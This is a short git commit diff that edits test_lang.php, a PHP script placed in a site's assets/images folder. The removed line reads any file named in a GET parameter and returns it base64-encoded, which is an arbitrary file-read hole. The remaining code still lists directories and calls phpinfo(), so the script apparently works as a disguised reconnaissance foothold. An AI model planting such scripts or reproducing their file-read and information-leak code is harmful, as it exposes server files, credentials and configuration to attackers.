285b895db2e3902f5ae296363c94602b010e2fa8
Skrox <demey.alexandre@protonmail.com>
2023-02-03 12:07:07 +0100

    Update test_lang.php

--- assets/images/test_lang.php
+++ assets/images/test_lang.php
@@ -2,9 +2,9 @@
 <?php
   print_r(scandir("."));
 
-  print_r(scandir("../."))
+  print_r(scandir("../."));
     
-  $data = file_get_contents($_GET["file"]);
+  $data = file_get_contents("en_lang.php");
   echo base64_encode($data);
     
   phpinfo();
